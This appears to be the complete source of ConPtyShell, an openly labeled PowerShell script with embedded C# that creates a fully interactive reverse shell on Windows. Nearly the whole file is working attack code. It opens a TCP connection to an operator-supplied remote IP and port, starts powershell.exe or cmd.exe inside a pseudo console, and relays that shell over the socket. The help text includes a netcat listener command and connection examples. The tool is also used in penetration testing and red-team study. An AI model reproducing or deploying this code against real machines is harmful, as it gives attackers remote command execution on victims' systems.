#Requires -Version 2

function Invoke-ConPtyShell
{   
    <#
        .SYNOPSIS
            ConPtyShell - Fully Interactive Reverse Shell for Windows 
            Author: splinter_code
            License: MIT
            Source: https://github.com/antonioCoco/ConPtyShell
        
        .DESCRIPTION
            ConPtyShell - Fully interactive reverse shell for Windows
            
            Properly set the rows and cols values. You can retrieve it from
            your terminal with the command "stty size".
            
            You can avoid to set rows and cols values if you run your listener
            with the following command:
                stty raw -echo; (stty size; cat) | nc -lvnp 3001
           
            If you want to change the console size directly from powershell
            you can paste the following commands:
                $width=80
                $height=24
                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
            
            
        .PARAMETER RemoteIp
            The remote ip to connect
        .PARAMETER RemotePort
            The remote port to connect
        .PARAMETER Rows
            Rows size for the console
            Default: "24"
        .PARAMETER Cols
            Cols size for the console
            Default: "80"
        .PARAMETER CommandLine
            The commandline of the process that you are going to interact
            Default: "powershell.exe"
            
        .EXAMPLE  
            PS>Invoke-ConPtyShell 10.0.0.2 3001
            
            Description
            -----------
            Spawn a reverse shell

        .EXAMPLE
            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
            
            Description
            -----------
            Spawn a reverse shell with specific rows and cols size
            
         .EXAMPLE
            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
            
            Description
            -----------
            Spawn a reverse shell (cmd.exe) with specific rows and cols size
            
    #>
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $RemoteIp,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $RemotePort,

        [Parameter()]
        [String]
        $Rows = "24",

        [Parameter()]
        [String]
        $Cols = "80",

        [Parameter()]
        [String]
        $CommandLine = "powershell.exe"
    )
    $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
    Add-Type -TypeDefinition $Source -Language CSharp;
    $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
    Write-Output $output
}

$Source = @"
using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

public static class ConPtyShell
{
    private const string errorString = "{{{ConPtyShellException}}}\r\n";
    private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;
    private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;
    private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    private const uint CREATE_NO_WINDOW = 0x08000000;
    private const int STARTF_USESTDHANDLES = 0x00000100;

    private const UInt32 INFINITE = 0xFFFFFFFF;
    private const uint GENERIC_READ = 0x80000000;
    private const uint GENERIC_WRITE = 0x40000000;
    private const uint FILE_SHARE_READ = 0x00000001;
    private const uint FILE_SHARE_WRITE = 0x00000002;
    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
    private const uint OPEN_EXISTING = 3;
    private const int STD_INPUT_HANDLE = -10;
    private const int STD_OUTPUT_HANDLE = -11;
    private const int STD_ERROR_HANDLE = -12;
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct COORD
    {
        public short X;
        public short Y;
    }
    
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    private static extern bool CreateProcessW(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
            
    [DllImport("kernel32.dll", SetLastError=true)]
    private static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr SecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
   
    [DllImport("kernel32.dll", SetLastError=true)]
    private static extern bool WriteFile(IntPtr hFile, byte [] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int ClosePseudoConsole(IntPtr hPC);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint mode);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetConsoleMode(IntPtr handle, out uint mode);
    
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    private static Socket ConnectSocket(string remoteIp, int remotePort){
        Socket s = null;
        IPAddress remoteIpInt = IPAddress.Parse(remoteIp);
        IPEndPoint ipEndpoint = new IPEndPoint(remoteIpInt, remotePort);
        Socket shellSocket = new Socket(ipEndpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
        try{
            shellSocket.Connect(ipEndpoint);
            if(shellSocket.Connected)
            s = shellSocket;
            byte[] banner = Encoding.ASCII.GetBytes("\r\nConPtyShell - @splinter_code\r\n");
            s.Send(banner);
        }
        catch{
            s = null;
        }
        return s;
    }
    
    private static void TryParseRowsColsFromSocket(Socket shellSocket, ref uint rows, ref uint cols){
        Thread.Sleep(500);//little tweak for slower connections
        if (shellSocket.Available > 0){
            byte[] received = new byte[100];
            int rowsTemp, colsTemp;
            int bytesReceived = shellSocket.Receive(received);
            string sizeReceived = Encoding.ASCII.GetString(received,0,bytesReceived); 
            string rowsString = sizeReceived.Split(' ')[0].Trim();
            string colsString = sizeReceived.Split(' ')[1].Trim();
            if(Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp)){
                rows=(uint)rowsTemp;
                cols=(uint)colsTemp;
            }
        }
    }
    
    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite){
        int securityAttributeSize = Marshal.SizeOf<SECURITY_ATTRIBUTES>();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES { nLength = securityAttributeSize, bInheritHandle=1, lpSecurityDescriptor=IntPtr.Zero };
        if(!CreatePipe(out InputPipeRead, out InputPipeWrite, pSec, 0))
            throw new InvalidOperationException("Could not create the InputPipe");
        if(!CreatePipe(out OutputPipeRead, out OutputPipeWrite, pSec, 0))
            throw new InvalidOperationException("Could not create the OutputPipe");
    }
    
    private static void InitConsole(){
        IntPtr hStdout = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        IntPtr hStdin = CreateFile("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
        SetStdHandle(STD_ERROR_HANDLE, hStdout);
        SetStdHandle(STD_INPUT_HANDLE, hStdin); 
    }
    
    private static void EnableVirtualTerminalSequenceProcessing()
    {
        uint outConsoleMode = 0;
        IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (!GetConsoleMode(hStdOut, out outConsoleMode))
        {
            throw new InvalidOperationException("Could not get console mode");
        }
        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        if (!SetConsoleMode(hStdOut, outConsoleMode))
        {
            throw new InvalidOperationException("Could not enable virtual terminal processing");
        }
    }
    
    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols){
        int result = -1;
        EnableVirtualTerminalSequenceProcessing();
        result = CreatePseudoConsole(new COORD { X = (short)cols, Y = (short)rows }, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);
        return result;
    }
    
    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        IntPtr lpSize = IntPtr.Zero;
        bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
        if (success || lpSize == IntPtr.Zero)
        {
            throw new InvalidOperationException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
        }
        STARTUPINFOEX startupInfo = new STARTUPINFOEX();
        startupInfo.StartupInfo.cb = Marshal.SizeOf<STARTUPINFOEX>();
        startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
        if (!success)
        {
            throw new InvalidOperationException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
        }
        success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero,IntPtr.Zero);
        if (!success)
        {
            throw new InvalidOperationException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
        }
        return startupInfo;
    }
    
    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
    {
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        int securityAttributeSize = Marshal.SizeOf<SECURITY_ATTRIBUTES>();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES { nLength = securityAttributeSize };
        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES { nLength = securityAttributeSize };
        bool success = CreateProcess(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
        if (!success)
        {
            throw new InvalidOperationException("Could not create process. " + Marshal.GetLastWin32Error());
        }
        return pInfo;
    }
    
    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine){
        STARTUPINFOEX startupInfo =  ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
        PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);
        return processInfo;
    }
        
    private static void ThreadReadPipeWriteSocket(object threadParams)
    {
        object[] threadParameters = (object[]) threadParams;
        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
        Socket shellSocket = (Socket)threadParameters[1];
        uint bufferSize=16*1024;
        byte[] bytesToWrite = new byte[bufferSize];
        bool readSuccess = false;
        Int32 bytesSent = 0;
        uint dwBytesRead=0;
        do{
            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, bufferSize, out dwBytesRead, IntPtr.Zero);
            bytesSent = shellSocket.Send(bytesToWrite, (Int32)dwBytesRead, 0);
        } while (bytesSent > 0 && readSuccess);
    }
    
    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, Socket shellSocket){
        object[] threadParameters = new object[2];
        threadParameters[0]=OutputPipeRead;
        threadParameters[1]=shellSocket;
        Thread thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocket);
        thThreadReadPipeWriteSocket.Start(threadParameters);
        return thThreadReadPipeWriteSocket;
    }
    
    private static void ThreadReadSocketWritePipe(object threadParams)
    {
        object[] threadParameters = (object[]) threadParams;
        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
        Socket shellSocket = (Socket)threadParameters[1];
        IntPtr hChildProcess = (IntPtr)threadParameters[2];
        uint bufferSize=16*1024;
        byte[] bytesReceived = new byte[bufferSize];
        bool writeSuccess = false;
        Int32 nBytesReceived = 0;
        uint bytesWritten = 0;
        do{
            nBytesReceived = shellSocket.Receive(bytesReceived, (Int32)bufferSize, 0);
            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);	
        } while (nBytesReceived > 0 && writeSuccess);
        TerminateProcess(hChildProcess, 0);
    }
    
    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, Socket shellSocket, IntPtr hChildProcess){
        object[] threadParameters = new object[3];
        threadParameters[0]=InputPipeWrite;
        threadParameters[1]=shellSocket;
        threadParameters[2]=hChildProcess;
        Thread thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipe);
        thReadSocketWritePipe.Start(threadParameters);
        return thReadSocketWritePipe;
    }
    
    public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine){
        string output = "";
        Socket shellSocket = ConnectSocket(remoteIp, remotePort);
        if(shellSocket == null){            
            output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
            return output;
        }
        TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);
        IntPtr InputPipeRead = new IntPtr(0);
        IntPtr InputPipeWrite = new IntPtr(0);
        IntPtr OutputPipeRead = new IntPtr(0);
        IntPtr OutputPipeWrite = new IntPtr(0);
        IntPtr handlePseudoConsole = new IntPtr(0);
        PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
        CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
        InitConsole();
        if(GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") == IntPtr.Zero){
            Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
            STARTUPINFO sInfo = new STARTUPINFO();
            sInfo.cb = Marshal.SizeOf(sInfo);
            sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES; 
            sInfo.hStdInput = InputPipeRead;       
            sInfo.hStdOutput = OutputPipeWrite;
            sInfo.hStdError = OutputPipeWrite;
            CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
        }
        else{
            Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell...\r\n");
            int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
            if(pseudoConsoleCreationResult != 0)
            {
                output += string.Format("{0}Could not create psuedo console. Error Code {1}", errorString, pseudoConsoleCreationResult.ToString());
                return output;
            }
            childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);
        }
        // Note: We can close the handles to the PTY-end of the pipes here
        // because the handles are dup'ed into the ConHost and will be released
        // when the ConPTY is destroyed.
        if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
        if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
        //Threads have better performance than Tasks
        Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket);
        Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess);
        WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
        //cleanup everything
        thThreadReadPipeWriteSocket.Abort();
        thReadSocketWritePipe.Abort();
        shellSocket.Shutdown(SocketShutdown.Both);
        shellSocket.Close();
        CloseHandle(childProcessInfo.hThread);
        CloseHandle(childProcessInfo.hProcess);
        if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
        if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
        if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
        output += "ConPtyShell kindly exited.\r\n";
        return output;
    }
}

public static class ConPtyShellMainClass{
    private static string help = "";
    
    private static bool HelpRequired(string param)
    {
        return param == "-h" || param == "--help" || param == "/?";
    }
    
    private static void CheckArgs(string[] arguments)
    {
        if(arguments.Length < 2){
            Console.Out.Write("\r\nConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
            System.Environment.Exit(0);
        }
            
    }
    
    private static void DisplayHelp()
    {
        Console.Out.Write(help);
    }
    
    private static string CheckRemoteIpArg(string ipString){
        IPAddress address;
        if (!IPAddress.TryParse(ipString, out address))
        {
            Console.Out.Write("\r\nConPtyShell: Invalid remoteIp value {0}\r\n", ipString);
            System.Environment.Exit(0);
        }
        return ipString;
    }
    
    private static int CheckInt(string arg){
        int ret = 0;
        if (!Int32.TryParse(arg, out ret))
        {
            Console.Out.Write("\r\nConPtyShell: Invalid integer value {0}\r\n", arg);
            System.Environment.Exit(0);
        }
        return ret;
    }
    
    private static uint ParseRows(string[] arguments){
        uint rows = 24;
        if (arguments.Length > 2)
            rows = (uint)CheckInt(arguments[2]);
        return rows;
    }
    
    private static uint ParseCols(string[] arguments){
        uint cols = 80;
        if (arguments.Length > 3)
            cols = (uint)CheckInt(arguments[3]);
        return cols;
    }

    private static string ParseCommandLine(string[] arguments){
        string commandLine = "powershell.exe";
        if (arguments.Length > 4)
            commandLine = arguments[4];
        return commandLine;
    }

    public static string ConPtyShellMain(string[] args){
        string output="";
        if (args.Length == 1 && HelpRequired(args[0]))
        {
            DisplayHelp();
        }
        else
        {
            CheckArgs(args);
            string remoteIp = CheckRemoteIpArg(args[0]);
            int remotePort = CheckInt(args[1]);
            uint rows = ParseRows(args);
            uint cols = ParseCols(args);
            string commandLine = ParseCommandLine(args);
            output=ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine);
        }
        return output;
    }
}
"@;